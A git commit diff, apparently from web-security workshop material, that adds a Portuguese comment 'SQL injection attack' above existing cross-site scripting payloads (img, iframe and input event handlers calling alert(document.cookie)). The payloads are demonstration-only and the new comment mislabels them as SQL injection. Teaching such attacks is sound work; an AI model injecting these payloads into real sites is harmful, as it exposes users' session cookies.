1f165f7ca70d81875be75b61b1b84f38c81b77c5
Izabel Chaves <145824500+rainbowcrack@users.noreply.github.com>
2025-03-29 17:08:00 -0300

    Update sala02.js

--- Workshop-Vai-na-WEB-Summit-2025/sala02.js
+++ Workshop-Vai-na-WEB-Summit-2025/sala02.js
@@ -1,4 +1,6 @@
 // alert(document.cookie); no Console DevTools
+// ataque de SQL injection
+
 <img src="x" onerror="alert(document.cookie)">
 <iframe src="x" onerror="alert(document.cookie)"></iframe>
 <input onfocus="alert(document.cookie)" value="Clique aqui">
